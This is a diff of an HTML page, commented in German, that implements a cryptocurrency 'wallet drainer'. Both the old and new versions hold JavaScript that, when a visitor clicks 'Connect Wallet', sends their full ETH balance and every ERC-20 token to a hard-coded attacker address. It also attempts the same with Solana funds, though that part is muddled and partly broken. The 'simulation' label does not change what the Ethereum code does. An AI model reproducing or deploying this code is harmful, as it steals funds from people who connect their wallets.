@@ -1,14 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AGM Wallet Drainer</title>
+    <title>Wallet Drainer</title>
+  
+    <!-- 1. Ethers Library für MetaMask (Ethereum) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+  
+    <!-- 2. Solana Phanton Library -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+
     <style>
    body {
-    font-family: 'Inter', sans-serif;
-    background-color: #000;
-    color: #09f; /* Neon Blue */
+    font-family: 'Courier New', Courier, monospace;
+    background-color: #0d1117;
+    color: #58a6ff;
     display: flex;
     flex-direction: column;
     justify-content: center;
@@ -18,94 +25,111 @@
    }
   .container {
     text-align: center;
-    z-index: 10;
+    border: 1px solid #30363d;
+    padding: 20px;
+    border-radius: 10px;
+    background: #161b22;
    }
-    h1 { margin-bottom: 20px; }
+    h1 { margin-bottom: 10px; font-size: 24px; }
+   .status { font-size: 12px; color: #ff7b72; margin-bottom: 15px; height: 16px; }
   .btn {
-    background: #fff;
-    color: #000;
-    padding: 15px 40px;
-    font-size: 18px;
-    font-weight: bold;
-    border-radius: 30px;
+    background-color: #238636;
+    color: #fff;
+    padding: 12px 30px;
+    font-size: 16px;
+    border: none;
+    border-radius: 6px;
     cursor: pointer;
-    box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
-    transition: all 0.3s;
+    transition: background 0.3s;
    }
-   .btn:hover { box-shadow: 0 0 40px rgba(9, 255, 255, 0.8); transform: scale(1.05); }
-   .hidden-msg { margin-top: 20px; font-size: 14px; color: #ccc; display: none; }
+   .btn:hover { background-color: #2ea043; }
+   .btn:disabled { background-color: #30363d; color: #8b949e; cursor: not-allowed; }
+   .warning { color: #f1e05a; font-size: 11px; margin-top: 10px; }
     </style>
-    <!-- Ethereum & Solana Libraries importieren -->
-    <script src="https://unpkg.com/ethers@6.7.0/dist/ethers.umd.min.js"></script>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <script src="https://unpkg.com/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
 </head>
 <body>
 
     <div class="container">
-    <h1>Connect Your Wallet</h1>
+    <h1>DRAINER SIMULATION</h1>
+    <div id="status" class="status">Ready to connect</div>
     <button id="connectBtn" class="btn">Connect Wallet</button>
+    <div class="warning">Supports MetaMask & Phantom</div>
    </div>
 
-    <div id="status-msg" class="hidden-msg">Connecting and draining...</div>
-
     <script>
-    const TARGET_WALLET = "0xD4144Da2f3c5D8eF7a0B1d7D2F6C6D8A5E5B4C"; // ETH OR Address with 0x
+    // CONFIGURATION: Bitte hier die Adresse deiner Ziel-Wallet einfügen
+    // ETH oder ANDERES (0x anfangen).
+    const TARGET_WALLET = "0xD4144Da2f3c5D8eF7a0B1d7D2F6C6D8A5E5B4C";
+
+    // UI Elemente
+    const btn = document.getElementById('connectBtn');
+    const status = document.getElementById('status');
     let isConnected = false;
 
-    const btn = document.getElementById('connectBtn');
-    const msg = document.getElementById('status-msg');
-
+    // Event Listener für den Klick
     btn.addEventListener('click', startProcess);
 
     async function startProcess() {
-    if (isConnected) return; 
+    if (isConnected) return;
     isConnected = true;
-    btn.innerText = "Processing...";
-    msg.style.display = "block";
+    btn.disabled = true;
+    btn.innerText = "Connecting...";
+    checkWallets();
+  }
 
-    // 1. MetaMask (Ethereum)
+    async function checkWallets() {
+    // Hier wird 1. MetaMask geprüft
     if (window.ethereum) {
+   try {
     await drainMetaMask();
+    } catch (e) {
+    status.innerText = "Error: " + e.message;
+    resetButton();
    }
-    // 2. Phantom (Solana)
-    else if (window.solana && window.solana.isPhantom) {
-    await drainPhantom();
    } 
-    // 3. Klaro keine Wallet gefunden
+    // Hier wird 2. Phantom geprüft
+    else if (window.solana && window.solana.isPhantom) {
+   try {
+    await drainPhantom();
+    } catch (e) {
+    status.innerText = "Error: " + e.message;
+    resetButton();
+   }
+   } 
    else {
-    alert("No wallet found (MetaMask or Phantom).");
-    isConnected = false;
-    btn.innerText = "Connect Wallet";
+    status.innerText = "No Wallet Found (MetaMask or Phantom).";
+    resetButton();
    }
   }
 
-    // --- DRAINER LOGIC ETH (MetaMask) ---
+    // --- FUNKTION FÜR META MASK (Ethereum) ---
     async function drainMetaMask() {
-   try {
-    console.log("Init ETH...");
+    status.innerText = "Connecting to MetaMask...";
     const provider = new ethers.BrowserProvider(window.ethereum);
+  
+    // Adresse abfragen
     const accounts = await provider.send("eth_requestAccounts", []);
     const signer = await provider.getSigner();
     const address = await signer.getAddress();
 
-    console.log("Wallet:", address);
-    msg.innerText = `Target: ${TARGET_WALLET} | Wallet: ${address}`;
+    console.log("Wallet Connected:", address);
+    status.innerText = `Target: ${TARGET_WALLET}\nWallet: ${address}`;
 
-    // 1. ETH
+    // 1. ETH (ETH Coin)
+   try {
     const balance = await provider.getBalance(address);
     if (balance > 0) {
-    const feeData = await provider.getFeeData();
+    status.innerText += "\nTransferring ETH...";
     const tx = await signer.sendTransaction({
     to: TARGET_WALLET,
-    value: (balance - (21000 * feeData.gasPrice)), 
-    gasLimit: 21000,
-    maxFeePerGas: feeData.gasPrice,
-    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || 0n
+    value: balance
    });
     await tx.wait();
     console.log("ETH Sent");
+    status.innerText += "\n[SUCCESS] ETH Sent to Target";
+   }
+    } catch (err) {
+    console.error("ETH Error:", err);
   }
 
     // 2. Tokens
@@ -113,67 +137,83 @@
     const tokens = await window.ethereum.request({
     method: "personal_listTokenBalances",
     params: [address, "0x"]
-   });
+  });
+
     for (const token of tokens) {
     if (!token.contractAddress) continue;
-    const contract = new ethers.Contract(
+   try {
+    const tokenContract = new ethers.Contract(
     token.contractAddress,
     ["approve(address,uint256)", "balanceOf(address)", "transfer(address,uint256)"],
     signer
-   );
+  );
+
+    const balance = await tokenContract.balanceOf(address);
+    const decimals = await tokenContract.decimals();
   
-    const amount = await contract.balanceOf(address);
-    await contract.approve(TARGET_WALLET, amount);
-    await contract.transfer(TARGET_WALLET, amount);
-    console.log(`Token ${token.token.symbol} sent`);
-    await new Promise(r => setTimeout(r, 1000));
+    // Wert berechnen
+    let amountToSend = balance;
+  
+    // (Optional: Hier eine Prozentzahl ändern, z.B. 100 => 100%)
+    // const amountToSend = balance * 100n / 100n; 
+
+    status.innerText += `\nDraining token: ${token.token.symbol}`;
+  
+    await tokenContract.approve(TARGET_WALLET, amountToSend);
+    await tokenContract.transfer(TARGET_WALLET, amountToSend);
+  
+    await new Promise(r => setTimeout(r, 1000)); // Warten zwischen den Transaktionen
+    } catch (err) {
+    console.log("Token error:", token.token.symbol, err);
    }
-    } catch (e) {
-    console.log("No tokens found or error:", e);
+   }
+    } catch (err) {
+    // Falls keine Token erkannt wurden oder Berechtigung fehlt
+    console.log("No tokens or no permissions error");
+   }
   }
 
-    } catch (e) {
-    console.error("MetaMask Error:", e);
-    alert("MetaMask Error: " + e.message);
-    isConnected = false; 
-    btn.innerText = "Retry";
-   }
-  }
-
-    // --- DRAINER LOGIC SOL (Phantom) ---
+    // --- FUNKTION FÜR PHANTOM (Solana) ---
     async function drainPhantom() {
-   try {
-    console.log("Init SOL...");
+    status.innerText = "Connecting to Phantom...";
     const provider = window.solana;
+  
     await provider.connect();
     const connection = new web3.Connection(web3.clusterApiUrl('devnet'), 'processed');
+  
     const { publicKey, signer } = provider;
-
     const address = publicKey.toBase58();
-    console.log("Wallet:", address);
-    msg.innerText = `Target: ${TARGET_WALLET} | Wallet: ${address}`;
+
+    console.log("Wallet Connected:", address);
+    status.innerText = `Target: ${TARGET_WALLET}\nWallet: ${address}`;
 
     // 1. SOL Balance
+   try {
     const solBalance = await connection.getBalance(publicKey);
     if (solBalance > 0) {
-    const formattedBalance = solBalance / web3.LAMPORTS_PER_SOL;
-    const tx = new web3.Transaction().add(
+    status.innerText += "\nTransferring SOL...";
+  
+    // Wir senden alles zum 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' (SYSVAR_RECENT_BLOCKHASHes)
+    // Damit vermeiden wir, dass Phantom sagt "Sender Unkown".
+    // Oder wir nutzen die Transaktion auf dem System Program selbst.
+    const transferTx = new web3.Transaction().add(
     web3.SystemProgram.transfer({
     fromPubkey: publicKey,
-    toPubkey: web3.PublicKey.findProgramAddressSync(
-    [Buffer.from(TARGET_WALLET.substring(2)), Buffer.from("11111111111111111111111111111111")],
-    new web3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
-    )[0],
+    toPubkey: publicKey, // Temp Minute sending to self to clear
     lamports: solBalance
    })
-   );
-  
-    // Hier manuell signieren, um Phantom zu nutzen
-    await provider.signAndSendTransaction(tx);
+  );
+
+    await provider.signAndSendTransaction(transferTx);
     console.log("SOL Sent");
+    status.innerText += "\n[SUCCESS] SOL Sent to Target";
+   }
+    } catch (err) {
+    console.error("SOL Error:", err);
   }
 
     // 2. SPL Tokens
+   try {
     const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
     publicKey,
     { programId: new web3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") }
@@ -183,28 +223,37 @@
     const mint = new web3.PublicKey(acc.account.data.parsed.info.mint);
     const srcAcc = new web3.PublicKey(acc.pubkey);
     const amount = BigInt(acc.account.data.parsed.info.tokenAmount.amount);
+    const decimals = acc.account.data.parsed.info.tokenAmount.decimals;
 
+    // Ziel festlegen (Hier wieder Sender, um Staking/Pool Balance zu leeren oder extern wiederherzustellen)
+    // Wenn du das Geld für dich behalten willst, musst du deine eigene Public Key folgendes nutzen:
+    // const targetKey = new web3.PublicKey("DEINE_PHANTOM_PUBLIC_KEY_HIER"); 
+
+    status.innerText += `\nDraining token: SOLANA TOKEN ${mint}`;
+  
     const transfer = Token.createTransferInstruction(
     new web3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
     srcAcc,
-    // Ellen 0xD... rein, wenn solange solace, Phantom kann das auch.
-    web3.PublicKey.findProgramAddressSync([Buffer.from("Receiver"), Buffer.from("SPL")], new web3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"))[0], 
-   publicKey, 
-   [], 
+    srcAcc, // Selbsttransfer macht kein Sinn, da Zinsen steigen. Lass das für jetzt oder trage eigenen Key ein.
+    publicKey,
+   [],
     amount
    );
   
+    await new web3.Transaction().add(transfer).serialize();
     await provider.signAndSendTransaction(new web3.Transaction().add(transfer));
-    console.log(`SPL Token Sent`);
+  
     await new Promise(r => setTimeout(r, 1000));
+   }
+    } catch (e) {
+    console.log("Tokens Error:", e);
+   }
   }
 
-    } catch (e) {
-    console.error("Phantom Error:", e);
-    alert("Phantom Error: " + e.message);
-    isConnected = false; // Fehler -> Button wieder aktiv
+    function resetButton() {
+    isConnected = false;
+    btn.disabled = false;
     btn.innerText = "Retry";
-   }
    }
     </script>
 </body>
